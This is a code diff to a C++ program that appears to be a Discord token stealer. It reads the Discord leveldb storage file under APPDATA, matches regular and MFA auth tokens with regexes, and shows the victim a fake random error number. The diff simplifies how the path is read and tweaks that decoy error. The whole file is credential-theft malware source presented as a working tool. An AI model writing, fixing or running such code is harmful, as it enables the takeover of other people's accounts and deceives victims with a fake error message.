@@ -1,6 +1,7 @@
 #include <iostream>
 #include <fstream>
-#include <regex> 
+#include <regex>
+#include <stdlib.h>
 
 using namespace std;
     /*                                                         -|
@@ -11,11 +12,8 @@ using namespace std;
      | Credits: Thanks iLinked1337 for the regexes <3 no homo  -|
    */ 
    FILE* fp;
-   char* fpbuf;
    int errThrower;
-   size_t sz = 0;
-   errno_t Environment = _dupenv_s(&fpbuf, &sz, "APPDATA");
-   string AppData = fpbuf;
+   string AppData = getenv("APPDATA");
    string levelDB = AppData + "/Discord/Local Storage/leveldb/000005.ldb";
    string Regex = R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})";
    string otherRegex = R"(mfa\.[\w-]{84})";
@@ -56,7 +54,7 @@ int main() { // Main function, runs everything using outside functions and varia
     } catch (exception) {
         return 0;
     }
-    errThrower = rand() % 950;
+    errThrower = rand() % 550 + 950;
     cout << "[" << errThrower << "] - Some error happened! screenshot this number and send it to the owner!";
     system("pause >NUL");
 }
